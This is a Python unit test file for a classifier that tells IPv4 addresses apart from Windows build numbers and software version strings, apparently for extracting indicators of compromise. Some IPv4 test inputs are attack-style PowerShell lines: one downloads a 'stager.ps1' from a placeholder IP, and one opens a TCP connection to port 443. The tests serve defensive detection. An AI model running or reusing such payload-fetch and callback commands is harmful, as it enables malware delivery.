"""Unit tests for the deterministic Entity Classifier · Feb 2026."""
from __future__ import annotations

import pytest

from engine.entity_classifier import (
    classify_token,
    classify_dotted_quads,
    summarise,
    KIND_IPV4,
    KIND_WINDOWS_BUILD,
    KIND_SOFTWARE_VERSION,
    KIND_GENERIC_DOTTED_QUAD,
)


# ─── Windows build ───────────────────────────────────────────────────

class TestWindowsBuild:
    def test_well_known_win11_build(self):
        res = classify_token("10.0.26100.1", "")
        assert res.kind == KIND_WINDOWS_BUILD
        assert res.confidence >= 0.95
        assert "win-build-prefix-hit" in "|".join(res.signals)

    def test_win10_1909(self):
        res = classify_token("10.0.18363.1256", "")
        assert res.kind == KIND_WINDOWS_BUILD

    def test_win10_with_os_context(self):
        res = classify_token(
            "10.0.99999.5",
            "[Environment]::OSVersion.Version → 10.0.99999.5",
        )
        assert res.kind == KIND_WINDOWS_BUILD
        assert res.confidence >= 0.9


# ─── Software version ────────────────────────────────────────────────

class TestSoftwareVersion:
    def test_assembly_version_context(self):
        res = classify_token(
            "9.0.0.0",
            'AssemblyVersion("9.0.0.0")',
        )
        assert res.kind == KIND_SOFTWARE_VERSION
        assert res.confidence >= 0.9

    def test_powershell_version(self):
        res = classify_token(
            "7.4.0.0",
            "$PSVersionTable.PSVersion = 7.4.0.0",
        )
        assert res.kind == KIND_SOFTWARE_VERSION

    def test_structural_trailing_zeros(self):
        # Even without a context word, 1.2.0.0 has a strong version shape.
        res = classify_token("1.2.0.0", "")
        assert res.kind == KIND_SOFTWARE_VERSION
        assert res.confidence >= 0.5

    def test_dotnet_assembly_ref(self):
        res = classify_token(
            "4.0.0.0",
            "System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
        )
        assert res.kind == KIND_SOFTWARE_VERSION

    def test_octet_over_255_small(self):
        # 1.2.300.4 has one octet > 255 (definitely not a valid IPv4).
        # With no context signals the classifier bails to
        # generic_dotted_quad — this is intentional; we require BOTH
        # small octets AND a version-context clue for confidence.
        res = classify_token("1.2.300.4", "")
        assert res.kind == KIND_GENERIC_DOTTED_QUAD


# ─── Genuine IPv4 ────────────────────────────────────────────────────

class TestIPv4:
    def test_connect_context(self):
        res = classify_token(
            "1.2.3.4",
            "$c = New-Object Net.Sockets.TcpClient; $c.Connect('1.2.3.4', 443)",
        )
        assert res.kind == KIND_IPV4
        assert res.confidence >= 0.9

    def test_url_scheme_context(self):
        res = classify_token(
            "203.0.113.5",
            "Invoke-WebRequest http://203.0.113.5/stager.ps1",
        )
        assert res.kind == KIND_IPV4

    def test_private_range_no_context(self):
        # 192.168.x.x is safe to auto-flag as IPv4 even without a
        # network verb nearby.
        res = classify_token("192.168.1.42", "")
        assert res.kind == KIND_IPV4

    def test_loopback(self):
        res = classify_token("127.0.0.1", "")
        assert res.kind == KIND_IPV4

    def test_all_zero_ambiguous(self):
        # "10.0.0.0" alone should NOT be flagged as IPv4 (very common
        # padding / placeholder pattern).
        res = classify_token("10.0.0.0", "")
        assert res.kind != KIND_IPV4


# ─── Generic dotted-quad fallback ────────────────────────────────────

class TestGenericDottedQuad:
    def test_ambiguous_dotted_quad_no_context(self):
        res = classify_token("1.2.3.4", "isolated token no context around it")
        assert res.kind == KIND_GENERIC_DOTTED_QUAD


# ─── Sweep / summarise ───────────────────────────────────────────────

class TestSweep:
    def test_sweep_mixed_document(self):
        text = (
            "Sample begin.\n"
            "AssemblyVersion(\"9.0.0.0\")\n"
            "Windows NT 10.0.26100.1 kernel\n"
            "$c.Connect('203.0.113.5', 443)\n"
            "some other 1.2.3.4 with nothing around it\n"
        )
        results = classify_dotted_quads(text)
        kinds = {r.token: r.kind for r in results}
        assert kinds["9.0.0.0"]      == KIND_SOFTWARE_VERSION
        assert kinds["10.0.26100.1"] == KIND_WINDOWS_BUILD
        assert kinds["203.0.113.5"]  == KIND_IPV4
        # 1.2.3.4 with no signals — generic
        assert kinds["1.2.3.4"] in (KIND_GENERIC_DOTTED_QUAD, KIND_IPV4)

    def test_summarise_buckets(self):
        text = "10.0.26100.1 and 192.168.1.1"
        s = summarise(classify_dotted_quads(text))
        assert len(s[KIND_WINDOWS_BUILD]) == 1
        assert len(s[KIND_IPV4]) == 1

    def test_determinism(self):
        text = "Windows NT 10.0.26100.1  · 9.0.0.0  · 1.2.3.4  · 203.0.113.5"
        first  = [r.to_dict() for r in classify_dotted_quads(text)]
        second = [r.to_dict() for r in classify_dotted_quads(text)]
        assert first == second


# ─── Regression: known false-positive from previous corpus ───────────

class TestRegression:
    def test_win_build_no_longer_flagged_as_ip(self):
        # Historically "10.0.26100.1" leaked into iocs["ips"]; the
        # classifier now routes it to windows_builds.
        res = classify_token("10.0.26100.1", "OSVersion.Version → 10.0.26100.1")
        assert res.kind == KIND_WINDOWS_BUILD

    def test_assembly_version_no_longer_flagged_as_ip(self):
        res = classify_token(
            "9.0.0.0",
            'AssemblyVersion("9.0.0.0")',
        )
        assert res.kind == KIND_SOFTWARE_VERSION


# ─── Multi-locale context keywords (Feb-2026) ────────────────────────

class TestMultiLocale:
    def test_russian_network_context(self):
        # "подключение к серверу" ≈ "connection to server"
        res = classify_token("203.0.113.5", "подключение к серверу 203.0.113.5")
        assert res.kind == KIND_IPV4

    def test_chinese_network_context(self):
        # "服务器" = "server"; "地址" = "address"
        res = classify_token("203.0.113.5", "目标服务器地址: 203.0.113.5")
        assert res.kind == KIND_IPV4

    def test_arabic_network_context(self):
        # "خادم" = "server"; "اتصال" = "connection"
        res = classify_token("203.0.113.5", "اتصال إلى خادم 203.0.113.5")
        assert res.kind == KIND_IPV4

    def test_chinese_version_context(self):
        # "版本" = "version"
        res = classify_token("9.0.0.0", "组件版本 9.0.0.0")
        assert res.kind == KIND_SOFTWARE_VERSION

    def test_japanese_win_build_context(self):
        # "ビルド番号" = "build number"
        res = classify_token(
            "10.0.19045.5011",
            "Windowsバージョン ビルド番号 10.0.19045.5011",
        )
        # 10.0.19045 IS a well-known Win10 build so the prefix rule
        # matches even without locale — but locale keyword coverage is
        # still exercised for the runtime path.
        assert res.kind == KIND_WINDOWS_BUILD
